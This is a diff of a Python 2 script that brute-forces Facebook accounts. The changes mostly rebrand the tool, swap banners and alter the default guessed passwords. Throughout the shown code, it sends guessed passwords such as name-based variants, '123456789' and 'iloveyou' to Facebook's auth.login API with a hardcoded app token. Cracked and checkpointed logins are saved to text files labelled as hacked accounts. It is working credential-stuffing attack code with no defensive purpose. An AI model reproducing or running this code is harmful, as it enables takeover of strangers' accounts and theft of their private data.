@@ -1,6 +1,6 @@
-# Source Generated with Decompyle++
-# File: without.pyc (Python 2.7)
-#Decompile by Zada ka Papa Furqan
+# Source Generated Open Style
+# Code Creation By M4RMU (Python 2.7)
+# Design By B4BY DR4G0N 
 
 
 try:
@@ -73,18 +73,27 @@ logo = """
 \033[1;96m →→→→→→→→→       тεcнησℓσgү вү мαямυ    ←←←←←←←←←←
 \033[1;94m---------------------------------------------------"""
 
+logo2 = '''\033[1;95m
+
+███╶╶╶██╶╶╶╶╶╶▄╶╶╶██▄╶╶╶╶╶▄╶╶╶█╶╶╶╶╶██╶╶╶
+█╶╶█╶╶█╶█╶╶╶╶╶╶█╶╶█╶╶█╶╶╶╶╶█╶╶█╶╶╶╶╶█╶█╶╶
+█╶▀╶▄╶█▄▄█╶██╶╶╶█╶█╶╶╶█╶█╶╶╶█╶█╶╶╶╶╶█▄▄█╶
+█╶╶▄▀╶█╶╶█╶█╶█╶╶█╶█╶╶█╶╶█╶╶╶█╶███▄╶╶█╶╶█╶
+███╶╶╶╶╶╶█╶█╶╶█╶█╶███▀╶╶█▄╶▄█╶╶╶╶╶▀╶╶╶╶█╶
+╶╶╶╶╶╶╶╶█╶╶█╶╶╶██╶╶╶╶╶╶╶╶▀▀▀╶╶╶╶╶╶╶╶╶╶█╶╶
+╶╶╶╶╶╶╶▀╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶▀╶╶╶ '''
 
 
 def tool():
     os.system('clear')
     print ''
-    print logo
+    print logo2
     time.sleep(1)
     print 'First Put Tool Username...'.center(50)
     print ''
     time.sleep(1)
-    username = raw_input('[+] Tool Username : ')
-    if username == 'BanDuLau':
+    username = raw_input('[+] Tool Username ==> : ')
+    if username == 'BANDULA':
         print ''
         time.sleep(1)
         print '\x1b[1;92mTool Username is correct'.center(50)
@@ -99,17 +108,16 @@ def tool():
         time.sleep(1)
         tool()
 
-
 def step_main():
     os.system('clear')
-    print logo
+    print logo2
     print ''
     time.sleep(1)
     print 'First Put Tool Password...'.center(50)
     print ''
     time.sleep(1)
-    username = raw_input('[+] Tool Password : ')
-    if username == 'BANDULA':
+    password = raw_input('[+] Tool Password ==>: ')
+    if password == 'BANDULA':
         print ''
         time.sleep(1)
         print '\x1b[1;92mTool Password is correct'.center(50)
@@ -123,7 +131,6 @@ def step_main():
         print ''
         time.sleep(1)
         step_main()
-
 
 def main():
     os.system('clear')
@@ -227,7 +234,7 @@ def log_fb():
             menu()
         elif 'www.facebook.com' in q['error']:
             print ''
-            print '\t\x1b[1;91mFlame cp😭'
+            print '\t\x1b[1;91mYOur Acc cp😭'
             print ''
             time.sleep(1)
             login()
@@ -236,7 +243,6 @@ def log_fb():
             print '\t\x1b[1;91mId/pass my be wrong'
             print ''
             time.sleep(1)
-
 
 
 def token():
@@ -255,7 +261,6 @@ def token():
         sav.write(token)
         sav.close()
         login()
-
 
 
 def menu():
@@ -550,7 +555,7 @@ def crack_select():
                         cp.close()
                         cps.append(uid + pass3)
                     else:
-                        pass4 = name.lower() + '786'
+                        pass4 = name.lower() + '969'
                         data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass4 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                         q = json.loads(data)
                         if 'access_token' in q:
@@ -566,7 +571,7 @@ def crack_select():
                             cp.close()
                             cps.append(uid + pass4)
                         else:
-                            pass5 = '786786'
+                            pass5 = '123456789'
                             data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass5 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                             q = json.loads(data)
                             if 'access_token' in q:
@@ -582,7 +587,7 @@ def crack_select():
                                 cp.close()
                                 cps.append(uid + pass5)
                             else:
-                                pass6 = 'pakistan'
+                                pass6 = 'iloveyou'
                                 data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass6 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                                 q = json.loads(data)
                                 if 'access_token' in q:
@@ -598,7 +603,7 @@ def crack_select():
                                     cp.close()
                                     cps.append(uid + pass6)
                                 else:
-                                    pass7 = 'pakistan123'
+                                    pass7 = 'myanmar123'
                                     data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass7 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                                     q = json.loads(data)
                                     if 'access_token' in q:
@@ -626,7 +631,7 @@ def crack_select():
     print ''
     print ' \x1b[1;92mThe process has been completed'
     print ' \x1b[1;92mTotal Ok/Cp: ' + str(len(oks)) + '/' + str(len(cps))
-    print ' \x1b[1;92mNote: Clone Account Saved Sdcard Folder: naimcp.txt'
+    print ' \x1b[1;92mNote: Clone Account Saved /Storage/Sdcard Folder: naimcp.txt'
     print 54 * '_'
     print ''
     print ''
@@ -742,13 +747,13 @@ def choice_select():
         print ' \t  [\x1b[1;97m\x1b[1;41m  Put 7 passwords And 3 idzz Link  \x1b[0m\x1b[1;93m]'
         print ''
         print ''
-        pass1 = raw_input('\x1b[1;93m[+] Password [1] :\x1b[1;92m ')
-        pass2 = raw_input('\x1b[1;93m[+] Password [2] :\x1b[1;92m ')
-        pass3 = raw_input('\x1b[1;93m[+] Password [3] :\x1b[1;92m ')
-        pass4 = raw_input('\x1b[1;93m[+] Password [4] :\x1b[1;92m ')
-        pass5 = raw_input('\x1b[1;93m[+] Password [5] :\x1b[1;92m ')
-        pass6 = raw_input('\x1b[1;93m[+] Password [6] :\x1b[1;92m ')
-        pass7 = raw_input('\x1b[1;93m[+] Password [7] :\x1b[1;92m ')
+        pass1 = raw_input('\x1b[1;95m[+] Password [1] :\x1b[1;92m ')
+        pass2 = raw_input('\x1b[1;95m[+] Password [2] :\x1b[1;93m ')
+        pass3 = raw_input('\x1b[1;95m[+] Password [3] :\x1b[1;95m ')
+        pass4 = raw_input('\x1b[1;95m[+] Password [4] :\x1b[1;94m ')
+        pass5 = raw_input('\x1b[1;95m[+] Password [5] :\x1b[1;97m ')
+        pass6 = raw_input('\x1b[1;95m[+] Password [6] :\x1b[1;91m ')
+        pass7 = raw_input('\x1b[1;95m[+] Password [7] :\x1b[1;96m ')
         print ''
         idt = raw_input('\x1b[1;92m[+] Input id [1] : \x1b[1;93m')
         
@@ -816,10 +821,10 @@ def choice_select():
         print '\tSelect valid option\x1b[0;97m'
         print ''
         choice_select()
-    print ' \x1b[1;93mTotal IDs :\x1b[1;92m ' + str(len(id))
-    print ' \x1b[1;93mhacking process has been Started'
-    print ' \x1b[1;93mPlzz wait to crack idzz'
-    print ' \x1b[1;93mPress ctrl + z to stop'
+    print ' \x1b[1;92mTotal IDs :\x1b[1;92m ' + str(len(id))
+    print ' \x1b[1;92mhacking process has been Started'
+    print ' \x1b[1;92mPlzz wait to crack idzz'
+    print ' \x1b[1;91mPress ctrl + z to stop'
     print 54 * '_'
     print ''
     print '[\x1b[1;97m\x1b[1;41m For Speedup Cloning Turn On Airplane mode 5 Second \x1b[0m\x1b[1;93m]'
@@ -838,7 +843,7 @@ def choice_select():
             data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
             q = json.loads(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[LEGEND-NAIM-OK] ' + uid + ' | ' + pass1 + ' | ' + name
+                print '\x1b[1;92m[LEGEND-BANDULA-OK] ' + uid + ' | ' + pass1 + ' | ' + name
                 ok = open('Syedok.txt', 'a')
                 ok.write(uid + '|' + pass1 + '\n')
                 ok.close()
@@ -853,13 +858,13 @@ def choice_select():
                 data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass2 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                 q = json.loads(data)
                 if 'access_token' in q:
-                    print '\x1b[1;92m[LEGEND-NAIM-OK] ' + uid + ' | ' + pass2 + ' | ' + name
+                    print '\x1b[1;92m[LEGEND-BANDULA-OK] ' + uid + ' | ' + pass2 + ' | ' + name
                     ok = open('Syedok.txt', 'a')
                     ok.write(uid + '|' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[1;93m[LEGEND-NAIM-CP] ' + uid + ' | ' + pass2 + ' | ' + name
+                    print '\x1b[1;93m[LEGEND-BANDULA-CP] ' + uid + ' | ' + pass2 + ' | ' + name
                     cp = open('Syedcp.txt', 'a')
                     cp.write(uid + '|' + pass2 + '\n')
                     cp.close()
@@ -868,13 +873,13 @@ def choice_select():
                     data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass3 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                     q = json.loads(data)
                     if 'access_token' in q:
-                        print '\x1b[1;92m[FLAME-NAIM-OK] ' + uid + ' | ' + pass3 + ' | ' + name
+                        print '\x1b[1;92m[LEGEND-BanDuLa-OK] ' + uid + ' | ' + pass3 + ' | ' + name
                         ok = open('Syedok.txt', 'a')
                         ok.write(uid + '|' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print '\x1b[1;93m[FLAME-NAIM-CP] ' + uid + ' | ' + pass3 + ' | ' + name
+                        print '\x1b[1;93m[LEGEND-BanDuLa-CP] ' + uid + ' | ' + pass3 + ' | ' + name
                         cp = open('naimcp.txt', 'a')
                         cp.write(uid + '|' + pass3 + '\n')
                         cp.close()
@@ -883,13 +888,13 @@ def choice_select():
                         data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass4 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                         q = json.loads(data)
                         if 'access_token' in q:
-                            print '\x1b[1;92m[LEGEND-NAIM-OK] ' + uid + ' | ' + pass4 + ' | ' + name
+                            print '\x1b[1;92m[LEGEND-BANDULA-OK] ' + uid + ' | ' + pass4 + ' | ' + name
                             ok = open('Syedok.txt', 'a')
                             ok.write(uid + '|' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error_msg']:
-                            print '\x1b[1;93m[LEGEND-NAIM-CP] ' + uid + ' | ' + pass4 + ' | ' + name
+                            print '\x1b[1;93m[LEGEND-BanDuLa-CP] ' + uid + ' | ' + pass4 + ' | ' + name
                             cp = open('Syedcp.txt', 'a')
                             cp.write(uid + '|' + pass4 + '\n')
                             cp.close()
@@ -898,13 +903,13 @@ def choice_select():
                             data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass5 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                             q = json.loads(data)
                             if 'access_token' in q:
-                                print '\x1b[1;92m[LEGEND-NAIM-OK] ' + uid + ' | ' + pass5 + ' | ' + name
+                                print '\x1b[1;92m[LEGEND-BANDULA-OK] ' + uid + ' | ' + pass5 + ' | ' + name
                                 ok = open('Syedok.txt', 'a')
                                 ok.write(uid + '|' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'www.facebook.com' in q['error_msg']:
-                                print '\x1b[1;93m[LEGEND-NAIM-CP] ' + uid + ' | ' + pass5 + ' | ' + name
+                                print '\x1b[1;93m[LEGEND-BanDuLa-CP] ' + uid + ' | ' + pass5 + ' | ' + name
                                 cp = open('Syedcp.txt', 'a')
                                 cp.write(uid + '|' + pass5 + '\n')
                                 cp.close()
@@ -913,13 +918,13 @@ def choice_select():
                                 data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass6 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                                 q = json.loads(data)
                                 if 'access_token' in q:
-                                    print '\x1b[1;92m[LEGEND-NAIM-OK] ' + uid + ' | ' + pass6 + ' | ' + name
+                                    print '\x1b[1;92m[LEGEND-BANDULA-OK] ' + uid + ' | ' + pass6 + ' | ' + name
                                     ok = open('Syedok.txt', 'a')
                                     ok.write(uid + '|' + pass6 + '\n')
                                     ok.close()
                                     oks.append(uid + pass6)
                                 elif 'www.facebook.com' in q['error_msg']:
-                                    print '\x1b[1;93m[LEGEND-NAIM-CP] ' + uid + ' | ' + pass6 + ' | ' + name
+                                    print '\x1b[1;93m[LEGEND-BanDuLa-CP] ' + uid + ' | ' + pass6 + ' | ' + name
                                     cp = open('Syedcp.txt', 'a')
                                     cp.write(uid + '|' + pass6 + '\n')
                                     cp.close()
@@ -928,13 +933,13 @@ def choice_select():
                                     data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass7 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                                     q = json.loads(data)
                                     if 'access_token' in q:
-                                        print '\x1b[1;92m[FLAME-NAIM-OK] ' + uid + ' | ' + pass7 + ' | ' + name
+                                        print '\x1b[1;92m[LEGEND-BANDULA-OK] ' + uid + ' | ' + pass7 + ' | ' + name
                                         ok = open('Syedok.txt', 'a')
                                         ok.write(uid + '|' + pass7 + '\n')
                                         ok.close()
                                         oks.append(uid + pass7)
                                     elif 'www.facebook.com' in q['error_msg']:
-                                        print '\x1b[1;93m[FLAME-NAIM-CP] ' + uid + ' | ' + pass7 + ' | ' + name
+                                        print '\x1b[1;93m[LEGEND-BanDuLa-CP] ' + uid + ' | ' + pass7 + ' | ' + name
                                         cp = open('flamecp.txt', 'a')
                                         cp.write(uid + '|' + pass7 + '\n')
                                         cp.close()
@@ -952,7 +957,7 @@ def choice_select():
     print ''
     print ' \x1b[1;92mThe process has been completed'
     print ' \x1b[1;92mTotal Ok/Cp: ' + str(len(oks)) + '/' + str(len(cps))
-    print ' \x1b[1;92mNote: HACKED Account Saved Sdcard Folder: naimcp.txt'
+    print ' \x1b[1;92mNote: HACKED Account Saved Storage/Sdcard Folder: naimcp.txt'
     print 54 * '_'
     print ''
     print ''
